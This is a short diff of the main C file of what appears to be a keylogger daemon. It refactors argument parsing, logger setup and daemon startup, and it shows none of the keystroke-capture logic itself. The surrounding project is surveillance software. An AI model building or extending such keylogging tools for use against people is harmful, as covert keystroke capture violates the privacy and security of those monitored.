@@ -12,6 +12,7 @@
 #include "common.h"
 #include "error.h"
 #include "keyloggerd.h"
+#include "parse-args.h"
 
 /* @todo set to /var/run/keyloggerd.pid when super user support is added */
 #define LOCKFILE "keyloggerd.pid"
@@ -22,7 +23,6 @@
 static void daemonize(void)
 {
     logger.debug("Starting keylogger daemon...");
-    logger.debug(cmd_args->prog_name);
 
     /*
      * Clear file creation mask and set it to a known value.
@@ -177,22 +177,20 @@ static bool is_daemon_already_running(void)
 
 int main(int argc, char *argv[])
 {
-    cmd_args = parse_args(argc, argv);
+    cmd_args_t cmd_args = parse_args(argc, argv);
 
-    if (cmd_args) {
-        logger.open(cmd_args->prog_name);
+    logger.open(cmd_args);
 
-        daemonize();
+    daemonize();
 
-        if (is_daemon_already_running()) {
-            err_quit("Aborting since daemon is already running");
-        }
-
-        keyloggerd();
-
-        logger.info("Daemon finished");
-        logger.close();
+    if (is_daemon_already_running()) {
+        err_quit("Aborting since daemon is already running");
     }
+
+    keyloggerd();
+
+    logger.info("Daemon finished");
+    logger.close();
 
     exit(0);
 }
